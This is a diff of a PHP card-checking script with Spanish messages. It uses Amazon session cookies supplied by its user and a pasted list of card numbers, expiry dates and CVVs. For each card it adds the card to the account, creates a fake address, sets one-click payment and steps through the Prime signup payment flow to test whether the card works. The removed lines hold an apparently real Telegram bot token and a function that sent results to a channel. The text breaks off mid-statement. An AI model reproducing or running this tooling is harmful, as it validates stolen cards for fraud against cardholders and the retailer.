@@ -1,15 +1,6 @@
 <?php
 error_reporting(0);
 
-// --- CONFIGURACIÓN DEL SCRAPPER ---
-$token_telegram = "8611373580:AAGdBiDVp5qK-WBmlrzVf2oKge2-HuvRS_U"; // Pon aquí tu token
-$chat_id_telegram = "-1003778786216"; // Pon aquí tu ID de canal (-100...)
-
-function enviarTelegram($mensaje, $token, $chat_id) {
-    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&parse_mode=Markdown&text=" . urlencode($mensaje);
-    file_get_contents($url);
-}
-
 function getstr($string, $start, $end){
     $str = explode($start, $string);
     $str = explode($end, $str[1]);
@@ -28,11 +19,12 @@ function multiexplode($delimiters, $string){
     return $two;
 }
 
-$lista_input = str_replace(array(" "), '/', $_POST['lista']);
-$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista_input);
+$lista = str_replace(array(" "), '/', $_POST['lista']);
+// $lista = str_replace(array(" "), '/', $_GET['lista']);
+$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
 
-if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista_matched)){
-    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista_input.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
+    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 }
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
@@ -52,7 +44,9 @@ function gerarLetrasAleatorias($quantidade) {
     return $resultado;
 }
 
-$letrasAleatorias = gerarLetrasAleatorias(5);
+$quantidadeLetras = 5; 
+$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);
+
 $lista = $_REQUEST['lista'];
 $cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
 $mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
@@ -60,27 +54,58 @@ $ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
 $cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
 
 $cookieprim = $_POST['cookies'];
+
 if($cookieprim == null){
     die("¡Coloque las cookies de amazon.com en el formulario de guardar cookies!");    
 }
+
 $cookieprim = trim($cookieprim);
 
-function convertCookie($text, $outputFormat = 'US'){
+function convertCookie($text, $outputFormat = 'BR'){
     $countryCodes = [
+        'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
+        'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
+        'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
         'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
+        'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
+        'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
+        'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
+        'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
+        'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbae', 'lc_value' => 'ar_AE'],
+        'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
+        'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
+        'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
+        'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
+        'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
+        'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
+        'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
+        'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
+        'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
     ];
-    $currentCountry = $countryCodes['US'];
+
+    if (!array_key_exists($outputFormat, $countryCodes)) {
+        return $text;
+    }
+
+    $currentCountry = $countryCodes[$outputFormat];
     $text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
     $text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
+    $text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
+    $text = str_replace('acbuc', $currentCountry['code'], $text);
+
     return $text;
 }
 
-$cookie2 = convertCookie($cookieprim, 'US');
+$_com_cookie = convertCookie($cookieprim, 'US');
+$tries = 3;
+
 $time = time();
 $first_name = $letrasAleatorias;
 $last_name = $letrasAleatorias;
+$fullnamekk = "$first_name $last_name";
 
-// OBTENER CSRF
+$cookie2 = convertCookie($cookieprim, 'US');
+
 $ch = curl_init(); 
 curl_setopt_array($ch, [
     CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
@@ -91,44 +116,105 @@ curl_setopt_array($ch, [
     CURLOPT_ENCODING => "gzip",
     CURLOPT_HTTPHEADER => array(
         'Host: www.amazon.com',
+        'Upgrade-Insecure-Requests: 1',
         'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'X-Requested-With: com.amazon.dee.app',
+        'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
     )
 ]);
 $r = curl_exec($ch);
-$csrf = getstr($r, 'csrfToken = "','"');
 curl_close($ch);
 
+$csrf = getstr($r, 'csrfToken = "','"');
+
 if ($csrf == null) {
-    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso, revalide sus cookies. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey, haga clic en "Mi cuenta", luego "Seguridad" e inicie sesión de nuevo. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 }
 
-// AGREGAR TARJETA
 $ch = curl_init(); 
 curl_setopt_array($ch, [
     CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
     CURLOPT_RETURNTRANSFER=>true,
     CURLOPT_SSL_VERIFYPEER=>false,
-    CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$first_name.'+'.$last_name.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
+    CURLOPT_FOLLOWLOCATION => true,
     CURLOPT_COOKIE => $cookie2,
-    CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded', 'X-Requested-With: com.amazon.dee.app')
+    CURLOPT_ENCODING => "gzip",
+    CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$first_name.'+'.$last_name.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
+    CURLOPT_HTTPHEADER => array(
+        'Host: www.amazon.com',
+        'Accept: application/json, text/plain, */*',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'client: MYXSettings',
+        'Content-Type: application/x-www-form-urlencoded',
+        'Origin: https://www.amazon.com',
+        'X-Requested-With: com.amazon.dee.app',
+        'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
+        'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    )
 ]);
 $r = curl_exec($ch);
-$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');
 curl_close($ch);
 
-// FUNCIONES DE DIRECCIÓN
-function adicionarEnderecoAmazon($cookie2, $first_name, $last_name){
-    $randTel = rand(1111111,9999999);
-    $ch = curl_init();
-    curl_setopt_array($ch, [
+$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');
+
+if (strpos($r, 'paymentInstrumentId')) {} else{
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies no detectadas, ingrese a Mi Cuenta y luego Seguridad e inserte su contraseña para revalidar. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+function adicionarEnderecoAmazon($cookie2){
+    global $first_name, $last_name;
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+        CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_COOKIE => $cookie2,
+        CURLOPT_ENCODING => "gzip",
+        CURLOPT_CUSTOMREQUEST => 'GET',
+        CURLOPT_HTTPHEADER => [
+            'host: www.amazon.com',
+            'referer: https://www.amazon.com/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
+            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+            'viewport-width: 1536'
+        ],
+    ]);
+    $getAddressAmazon = curl_exec($curl);
+    curl_close($curl);
+
+    $csrftokenaddress = urlencode(getStr($getAddressAmazon, "type='hidden' name='csrfToken' value='","'"));
+    $addressfromjwt = getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="','"');
+    $customeriddkk = getstr($getAddressAmazon, '"customerID":"','"');
+    $interactionidd = getStr($getAddressAmazon, 'name="address-ui-widgets-address-wizard-interaction-id" value="','"');
+    $starttimekk = getStr($getAddressAmazon, 'name="address-ui-widgets-form-load-start-time" value="','"');
+    $requestidd = getStr($getAddressAmazon, '=AddView&hostPageRID=','&' , 1);
+    $csrftokv2 = urlencode(getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-csrfToken" value="','"'));
+    $randotelefone = rand(1111111,9999999);
+
+    $curl = curl_init();
+    curl_setopt_array($curl, [
         CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_post',
         CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 30,
         CURLOPT_COOKIE => $cookie2,
-        CURLOPT_POSTFIELDS => "address-ui-widgets-countryCode=US&address-ui-widgets-enterAddressFullName=$first_name+$last_name&address-ui-widgets-enterAddressPhoneNumber=313$randTel&address-ui-widgets-enterAddressLine1=Street+123&address-ui-widgets-enterAddressCity=Montgomery&address-ui-widgets-enterAddressStateOrRegion=AL&address-ui-widgets-enterAddressPostalCode=36104&address-ui-widgets-use-as-my-default=true",
-        CURLOPT_HTTPHEADER => ['content-type: application/x-www-form-urlencoded'],
+        CURLOPT_ENCODING => "gzip",
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => 'csrfToken='.$csrftokenaddress.'&addressID=&address-ui-widgets-countryCode=US&address-ui-widgets-enterAddressFullName='.$first_name.'+'.$last_name.'&address-ui-widgets-enterAddressPhoneNumber=313'.$randotelefone.'&address-ui-widgets-enterAddressLine1=Travel+General+Delivery&address-ui-widgets-enterAddressLine2=&address-ui-widgets-enterAddressCity=Montgomery&address-ui-widgets-enterAddressStateOrRegion=AL&address-ui-widgets-enterAddressPostalCode=36104&address-ui-widgets-urbanization=&address-ui-widgets-previous-address-form-state-token='.$addressfromjwt.'&address-ui-widgets-use-as-my-default=true&address-ui-widgets-delivery-instructions-desktop-expander-context=%7B%22deliveryInstructionsDisplayMode%22+%3A+%22CDP_ONLY%22%2C+%22deliveryInstructionsClientName%22+%3A+%22YourAccountAddressBook%22%2C+%22deliveryInstructionsDeviceType%22+%3A+%22desktop%22%2C+%22deliveryInstructionsIsEditAddressFlow%22+%3A+%22false%22%7D&address-ui-widgets-addressFormButtonText=save&address-ui-widgets-addressFormHideHeading=true&address-ui-widgets-heading-string-id=&address-ui-widgets-addressFormHideSubmitButton=false&address-ui-widgets-enableAddressDetails=true&address-ui-widgets-returnLegacyAddressID=false&address-ui-widgets-enableDeliveryInstructions=true&address-ui-widgets-enableAddressWizardInlineSuggestions=true&address-ui-widgets-enableEmailAddress=false&address-ui-widgets-enableAddressTips=true&address-ui-widgets-amazonBusinessGroupId=&address-ui-widgets-clientName=YourAccountAddressBook&address-ui-widgets-enableAddressWizardForm=true&address-ui-widgets-delivery-instructions-data=%7B%22initialCountryCode%22%3A%22US%22%7D&address-ui-widgets-ab-delivery-instructions-data=&address-ui-widgets-address-wizard-interaction-id='.$interactionidd.'&address-ui-widgets-obfuscated-customerId='.$customeriddkk.'&address-ui-widgets-locationData=&address-ui-widgets-enableLatestAddressWizardForm=false&address-ui-widgets-avsSuppressSoftblock=false&address-ui-widgets-avsSuppressSuggestion=false&address-ui-widgets-csrfToken='.$csrftokv2.'&address-ui-widgets-form-load-start-time='.$starttimekk.'&address-ui-widgets-clickstream-related-request-id='.$requestidd.'&address-ui-widgets-locale=',
+        CURLOPT_HTTPHEADER => [
+            'content-type: application/x-www-form-urlencoded',
+            'host: www.amazon.com',
+            'origin: https://www.amazon.com',
+            'referer: https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
+            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+            'viewport-width: 1536'
+        ],
     ]);
-    curl_exec($ch);
-    curl_close($ch);
+    $addAddressValid = curl_exec($curl);
+    curl_close($curl);
 }
 
 function obtenerEnderecoAmazon($cookie2, $csrf) {
@@ -136,8 +222,22 @@ function obtenerEnderecoAmazon($cookie2, $csrf) {
     curl_setopt_array($ch, [
         CURLOPT_URL => 'https://www.amazon.com/hz/mycd/ajax',
         CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_COOKIE => $cookie2,
-        CURLOPT_POSTFIELDS => 'data=%7B%22param%22%3A%7B%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' . urlencode($csrf),
+        CURLOPT_ENCODING => "gzip",
+        CURLOPT_POSTFIELDS => 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' . urlencode($csrf),
+        CURLOPT_HTTPHEADER => array(
+            'Host: www.amazon.com',
+            'Accept: application/json, text/plain, */*',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+            'client: MYXSettings',
+            'Content-Type: application/x-www-form-urlencoded',
+            'Origin: https://www.amazon.com',
+            'X-Requested-With: com.amazon.dee.app',
+            'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
+            'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+        )
     ]);
     $r = curl_exec($ch);
     curl_close($ch);
@@ -145,98 +245,348 @@ function obtenerEnderecoAmazon($cookie2, $csrf) {
 }
 
 $addresid = obtenerEnderecoAmazon($cookie2, $csrf);
-if(empty($addresid)){
-    adicionarEnderecoAmazon($cookie2, $first_name, $last_name);
-    sleep(2); // <--- SLEEP 1 (Original)
+
+if (empty($addresid)) {
+    adicionarEnderecoAmazon($cookie2);
+    sleep(2);
     $addresid = obtenerEnderecoAmazon($cookie2, $csrf);
+    if (empty($addresid)) {
+        die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Se registró una dirección, revise su cuenta e intente de nuevo. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    }
 }
 
-// SET ONE CLICK
 $ch = curl_init(); 
 curl_setopt_array($ch, [
     CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
     CURLOPT_RETURNTRANSFER=>true,
-    CURLOPT_COOKIE => $cookie2,
+    CURLOPT_SSL_VERIFYPEER=>false,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_COOKIE         => $cookie2,
+    CURLOPT_ENCODING       => "gzip",
     CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
+    CURLOPT_HTTPHEADER => array(
+        'Host: www.amazon.com',
+        'Accept: application/json, text/plain, */*',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'client: MYXSettings',
+        'Content-Type: application/x-www-form-urlencoded',
+        'Origin: https://www.amazon.com',
+        'X-Requested-With: com.amazon.dee.app',
+        'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
+        'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    )
 ]);
 $r = curl_exec($ch);
 curl_close($ch);
 
-// INTENTO DE SUSCRIPCIÓN PRIME
+if(strpos($r, '"success":true,"paymentInstrumentId":"')) {} else {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al agregar tarjeta de crédito. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$ch = curl_init(); 
+curl_setopt_array($ch, [
+    CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
+    CURLOPT_RETURNTRANSFER=>true,
+    CURLOPT_SSL_VERIFYPEER=>false,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_COOKIE         => $cookie2,
+    CURLOPT_ENCODING       => "gzip",
+    CURLOPT_HTTPHEADER => array(
+        'Host: www.amazon.com',
+        'Upgrade-Insecure-Requests: 1',
+        'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'X-Requested-With: com.amazon.mShop.android.shopping',
+        'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
+    )
+]);
+$r = curl_exec($ch);
+curl_close($ch);
+
+$market = getstr($r, "ue_mid = '","'");
+$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
+$customerId = getStr($r, 'customerId":"','"');
+$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
+$session_id   = getstr($r, '"sessionId":"', '"');
+
+if ($wigstst == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al acceder a AmazonWallet. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$ch = curl_init(); 
+curl_setopt_array($ch, [
+    CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
+    CURLOPT_RETURNTRANSFER=>true,
+    CURLOPT_SSL_VERIFYPEER=>false,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_COOKIE         => $cookie2,
+    CURLOPT_ENCODING       => "gzip",
+    CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
+    CURLOPT_HTTPHEADER => array(
+        'Host: www.amazon.com',
+        'Accept: application/json, text/javascript, */*; q=0.01',
+        'X-Requested-With: XMLHttpRequest',
+        'Widget-Ajax-Attempt-Count: 0',
+        'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
+        'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
+        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+        'Origin: https://www.amazon.com',
+        'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
+        'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
+    )
+]);
+$r = curl_exec($ch);
+curl_close($ch);
+
+$payment = getStr($r, '"paymentMethodId\":\"','\"');
+$cookie2 = convertCookie($cookieprim, 'US');
+
+if ($payment == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener tarjeta vinculada. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$cookieUS1 = 'amazon.com';
+
 $ch = curl_init();
 curl_setopt_array($ch, [
-    CURLOPT_URL => "https://www.amazon.com/gp/prime/pipeline/membersignup",
+    CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
     CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_COOKIE => $cookie2,
-    CURLOPT_POSTFIELDS => "clientId=DiscoveryBar&ingressId=JoinPrimePill&ref=join_prime_cta_discobar&primeCampaignId=DiscoveryBar_JoinPrimePill_ATVHome&redirectURL=&inline=1&disableCSM=1",
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_COOKIE         => $cookie2,
+    CURLOPT_ENCODING       => "gzip",
+    CURLOPT_POSTFIELDS     => "clientId=DiscoveryBar&ingressId=JoinPrimePill&ref=join_prime_cta_discobar&primeCampaignId=DiscoveryBar_JoinPrimePill_ATVHome&redirectURL=&inline=1&disableCSM=1",
+    CURLOPT_HTTPHEADER => array(
+        "Host: $cookieUS1",
+        "content-type: application/x-www-form-urlencoded",
+    ),
 ]);
+$result = curl_exec($ch);
+curl_close($ch);
+
+$wid9090 = getstr($result, 'name=&amp;quot;ppw-widgetState&amp;quot; value=&amp;quot;','&amp;quot;');
+$sessionds = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;session&amp;quot;:&amp;quot;','&amp;quot');
+$customerID = getstr($result, 'quot;customerId&amp;quot;:&amp;quot;','&amp;quot');
+$noovotoken = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
+$ohtoken1 = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
+$ohtoken2 = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;serializedState&amp;quot;:&amp;quot;','&amp;quot;');
+
+if ($ohtoken2 == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo en suscripción AmazonPrime. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $brurloa92);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+$headers = array();
+$headers[] = 'Host: www.'.$cookieUS1.'';
+$headers[] = 'Cookie: '.$cookie2.'';
+$headers[] = 'X-Requested-With: XMLHttpRequest';
+$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+$headers[] = 'Origin: https://www.'.$cookieUS1.'';
+$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
+$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$result = curl_exec($ch);
+curl_close($ch);
+
+$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
+$ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');
+
+if ($ohtoken3 == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al generar transacción con tarjeta. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+$headers = array();
+$headers[] = 'Host: www.'.$cookieUS1.'';
+$headers[] = 'Cookie: '.$cookie2.'';
+$headers[] = 'X-Requested-With: XMLHttpRequest';
+$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+$headers[] = 'Origin: https://'.$cookieUS1.'';
+$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$result = curl_exec($ch);
+curl_close($ch);
+
+$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
+
+if ($walletid2 == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo al obtener walletid2. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+
+$ch = curl_init();
+curl_setopt_array($ch, [
